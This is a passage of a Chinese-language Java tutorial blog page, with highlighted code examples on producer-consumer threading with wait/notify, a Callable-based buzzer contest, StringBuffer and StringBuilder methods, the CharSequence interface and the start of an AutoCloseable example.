class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Resource1 resource1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer1</span><span class="params">(Resource1 resource1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.resource1 = resource1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">50</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.resource1.make();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Resource1 resource1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer1</span><span class="params">(Resource1 resource1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.resource1 = resource1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">50</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.resource1.get();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//表示生产个数</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Computer</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【第&quot;</span> + count + <span class="string">&quot;台电脑】&quot;</span> + <span class="string">&quot;电脑名字： &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、价值： &quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Resource1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Computer computer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">make</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.computer != <span class="literal">null</span>) &#123; <span class="comment">//已经生产过了</span></span><br><span class="line">            <span class="built_in">super</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">this</span>.computer = <span class="keyword">new</span> <span class="title class_">Computer</span>(<span class="string">&quot;Mes9s0的电脑&quot;</span>, <span class="number">1.1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;【生产电脑】&quot;</span> + <span class="built_in">this</span>.computer);</span><br><span class="line">        <span class="built_in">super</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.computer == <span class="literal">null</span>) &#123; <span class="comment">//没有生产过</span></span><br><span class="line">            <span class="built_in">super</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;【取走电脑】&quot;</span> + <span class="built_in">this</span>.computer);</span><br><span class="line">        <span class="built_in">this</span>.computer = <span class="literal">null</span>; <span class="comment">//已经取走了</span></span><br><span class="line">        <span class="built_in">super</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Resource1</span> <span class="variable">resource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Resource1</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Producer1</span>(resource1)).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Consumer1</span>(resource1)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73857.jpg"                      alt="image-20220809143156391"                ></p><h4 id="竞争抢答"><a href="#竞争抢答" class="headerlink" title="竞争抢答"></a>竞争抢答</h4><p>​    实现一个竞拍抢答程序:要求设置三个抢答者美三个线程)，而后同时发出抢答指令，抢答成功者给出成功提示，抢答者未成功者给出失败提示。</p><p>​    对于这一个多线程的操作由于里面需要牵扯到数据的返回问题，那么现在最好使用的 Callable是比较方便的处理形式，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//竞争抢答</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.FutureTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread8</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//抢答处理</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.flag == <span class="literal">false</span>)&#123; <span class="comment">//抢答成功</span></span><br><span class="line">                <span class="built_in">this</span>.flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> Thread.currentThread().getName() + <span class="string">&quot;抢答成功！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> Thread.currentThread().getName() + <span class="string">&quot;抢答失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        <span class="type">MyThread8</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread8</span>();</span><br><span class="line">        FutureTask&lt;String&gt; taskA = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(mt);</span><br><span class="line">        FutureTask&lt;String&gt; taskB = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(mt);</span><br><span class="line">        FutureTask&lt;String&gt; taskC = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(mt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(taskA,<span class="string">&quot;竞赛者A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(taskB,<span class="string">&quot;竞赛者B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(taskC,<span class="string">&quot;竞赛者C&quot;</span>).start();</span><br><span class="line">        System.out.println(taskA.get());</span><br><span class="line">        System.out.println(taskB.get());</span><br><span class="line">        System.out.println(taskC.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073857.jpg"                      alt="image-20220809153525226"                ></p><hr><h3 id="Java基础类库"><a href="#Java基础类库" class="headerlink" title="Java基础类库"></a>Java基础类库</h3><h4 id="StringBuffer类"><a href="#StringBuffer类" class="headerlink" title="StringBuffer类"></a>StringBuffer类</h4><p>​    String类 是在所有项目开发之中一定会使用到的一个功能类，并且这个类拥有如下的特点：<strong>1、每一个字符串的常量都属于一个 String 类的匿名对象，并且不可更改。2、String 有两个常量池:静态常量池、运行时常量池。3、String 类对象实例化建议使用直接赋值的形式完成，这样可以直接将对象保护在对象池中以下次重用。</strong></p><p>​    但是也可以发现String 类的最大弊端：<strong>内容不允许修改</strong>。虽然大部分情况都不需要修改，但是依然可能会出现这种情况。</p><p>​    为了解决此问题，专门提供有一个 StringBuffer 类可以实现字符串的内容修改。</p><p>​    StringBuffer 并不像 String 类那样拥有两种对象实例化方式，StringBuffer 必须像普通类对象那样，首先进行对象的实例化，而后才可以调用方法执行处理，而这个时候可以考虑使用 StringBuffer 类中的如下方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造方法: <span class="keyword">public</span> <span class="title function_">StringBuffer</span><span class="params">()</span>; </span><br><span class="line">构造方法: <span class="keyword">public</span> <span class="title function_">StringBuffer</span><span class="params">(String str)</span>，接收初始化字符串内容;</span><br><span class="line">数据追加: <span class="keyword">public</span> StringBuffer <span class="title function_">append</span><span class="params">(数据类型变量)</span>，相当于字符串中的“+”操作；</span><br></pre></td></tr></table></figure><p>范例：观察String与StringBuffer对比</p><p>1、String类对象引用传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//String类对象引用传递</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        change(str);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(String temp)</span>&#123;</span><br><span class="line">        temp += <span class="string">&quot;World !&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073859.jpg"                      alt="image-20220809155730859"                ></p><p>​    可以发现最后的内容并没有改变。</p><p>2、StingBuffer类对象引用传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//StringBuffer类对象引用传递</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">        change(sb);</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(StringBuffer temp)</span>&#123;</span><br><span class="line">        temp.append(<span class="string">&quot;World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73860.jpg"                      alt="image-20220809160310084"                ></p><p>​    大部分情况下不是会出现改变字符串的内容，这种改变指的并不是针对于静态常量池的改变。</p><p>范例：分析一下已有问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//String类对象引用传递</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="string">&quot;mes&quot;</span> + <span class="string">&quot;9s0&quot;</span>;</span><br><span class="line">        System.out.println(strB == strA);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    注：这个时候的 strB 对象的内容并不算是改变，严格的意义上来讲，对于现在的 strB 当程序编译之后会变为如下的形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">buf.append(<span class="string">&quot;mes&quot;</span>).append(<span class="string">&quot;9&quot;</span>).append(<span class="string">&quot;s0&quot;</span>);</span><br></pre></td></tr></table></figure><p>​    <strong>所有的“+”在编译之后都变为了 StringBuffer 中的 append() 方法，并且在程序之中 StringBuffer 与 String 类对象之间可以直接相互转换：1、String 类对象变为 StringBuffer 可以依靠 StringBuffer 类的构造方法或者使用append 方法。2、所有类对象都可以通过 toString() 方法将其变为 String 类型。</strong></p><p>​    在 StringBuffer 类里面除了可以支持有字符串内容的修改之外，实际上也提供有了一些 String 类所不具备的方法：</p><p>​    1、插入数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public StringBuffer insert(int offset,数据类型 b)：</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        buf.append(<span class="string">&quot;9s0&quot;</span>).insert(<span class="number">0</span>,<span class="string">&quot;me&quot;</span>).insert(<span class="number">2</span>,<span class="string">&quot;s&quot;</span>);</span><br><span class="line">        System.out.println(buf);<span class="comment">//mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、删除指定范围的数据:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        buf.append(<span class="string">&quot;mes9s0!!&quot;</span>).delete(<span class="number">6</span>,<span class="number">8</span>);<span class="comment">//mes9s0</span></span><br><span class="line">        System.out.println(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、字符串内容反转（最大特征）:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        buf.append(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(buf.reverse());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    实际上与  StringBuffer 类还有一个类似的功能类: StringBuilder 类.这个类是在 JDK1.5 的时候提供的，该类中提供的方法与 StringBuffer 功能相同，最大的区别在于 StringBuffer 类中的方法属于线程安全的，全部使用了 synchronized 关键字进行标注，而 StringBuilder 类属于非线程安全的。</p><p>​    <strong>String、StringBuffer、StringBuilder 的区别：1、String 类是字符串的首选类型，其最大的特点是内容不允许修改；2、StringBuffer 与 StringBuilder 类的内容允许修改；3、StringBuffer 是在 JDK 1.0 的时候提供的，属于线程安全的操作,而 StringBuilder 是在 JDK 1.5 之后提供的,不属于线程安全的操作。</strong></p><h4 id="CharSequence接口"><a href="#CharSequence接口" class="headerlink" title="CharSequence接口"></a>CharSequence接口</h4><p>​    CharSequence 是一个描述字符串结构的接口,在这个接口里面一般发现有三种常用子类：String 类、StringBuffer 类、StringBuilder 类。</p><p>​    三者的定义结构都与 CharSequence 接口有关。String 是首选，String Buffer 不仅是 CharSequence 的一个子类，接受 CharSequence ，同样StringBufffer 也可以。</p><p>​    子类关系：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073901.jpg"                      alt="image-20220809230834157"                ></p><p>​    现在只要有字符串就可以为CharSequence接口实例化。</p><p>​    所以字符串加入公共的描述类型，就是 CharSequence ，只要有字符串，就可以被 CharSequence 接口识别化，所有的字符串都可以这样接收。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CharSequence</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>; <span class="comment">//子类实例向父接口转型</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    CharSequence 本身是一个接口，在该接口之中也定义有如下操作方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取指定索引字符：<span class="keyword">public</span> <span class="type">char</span> <span class="title function_">charAt</span><span class="params">(<span class="type">int</span> index)</span>;</span><br><span class="line">获取字符串的长度：<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span>;</span><br><span class="line">截取部分字符串：<span class="keyword">public</span> CharSequence <span class="title function_">subSequence</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span>;</span><br></pre></td></tr></table></figure><p>范例：截取字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CharSequence</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>; <span class="comment">//子类实例向父接口转型</span></span><br><span class="line">        <span class="type">CharSequence</span> <span class="variable">sub</span> <span class="operator">=</span> str.subSequence(<span class="number">4</span>,<span class="number">6</span>);</span><br><span class="line">        System.out.println(sub);<span class="comment">//s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    所以以后只要看见了 CharSequence 描述的就是一个字符串。</p><h4 id="AutoCloseable接口"><a href="#AutoCloseable接口" class="headerlink" title="AutoCloseable接口"></a>AutoCloseable接口</h4><p>​    AutoCloseable 主要是用于日后进行资源开发的处理上，以实现资源的自动关闭（释放）。例如：在以后进行文件、网络、数据库开发的过程之中由于服务器的资源有限，所以使用之后一定要关闭资源，这样才可以被更多的使用者所使用。</p><p>​    为了更好的说明资源的问题，将通过一个消息的发送处理来完成。</p><p>范例：手工实现资源处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AutoCloseable接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>; <span class="comment">//消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetMessage</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span> &#123; <span class="comment">//实现消息的处理机制</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NetMessage</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">open</span><span class="params">()</span> &#123; <span class="comment">//获取资源链接</span></span><br><span class="line">        System.out.println(<span 